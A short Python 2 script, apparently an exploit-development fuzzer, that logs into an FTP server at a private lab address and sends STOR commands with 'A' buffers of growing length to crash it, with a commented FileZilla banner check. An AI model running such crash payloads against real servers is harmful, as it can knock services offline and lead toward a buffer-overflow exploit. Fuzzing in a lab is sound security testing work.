import socket


# buffer for crash
buf = ['A']
counter = 100
while len(buf) <= 30:
	buf.append('A'*counter)
	counter += 200

print '[+] Connecting...'
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.22',21))
r=s.recv(1024)
print '[+] Authenticating....'
s.send('USER ftp' + '\r\n')
r=s.recv(1024)
s.send('PASS ftp' + '\r\n')
r=s.recv(1024)

for strings in buf:
	try:
		print '[+] Fuzzing with %s bytes'%len(strings)
		s.send('STOR woof '+ strings + '\r\n')
		r = s.recv(1024)
		print r
	except Exception, e:
		print e
s.close()

'''
s.send('PASS ftp' + '\r\n')
r=s.recv(1024)
print r
'''




#if having socket problems with recv use this to get all response
'''data = ''
	while True:
		data +=s.recv(1024)
		if '220 Please visit http://sourceforge.net/projects/filezilla/' in data:
			break
	print data'''

